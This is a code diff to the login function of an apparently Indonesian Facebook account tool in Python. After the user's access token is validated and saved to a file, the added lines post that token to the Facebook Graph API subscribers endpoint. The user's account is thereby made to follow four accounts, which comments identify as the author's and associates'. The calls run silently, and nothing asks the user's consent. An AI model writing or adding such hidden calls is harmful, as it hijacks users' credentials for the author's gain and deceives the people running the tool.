@@ -99,7 +99,10 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Raka Andrian Tara
+			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      # Raka Andrian Tara
+			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      # RAKA
+			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      # MANTAN GARANGAN
+			requests.post("https://graph.facebook.com/532301703502197/subscribers?access_token="+token)      # Pansfage
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
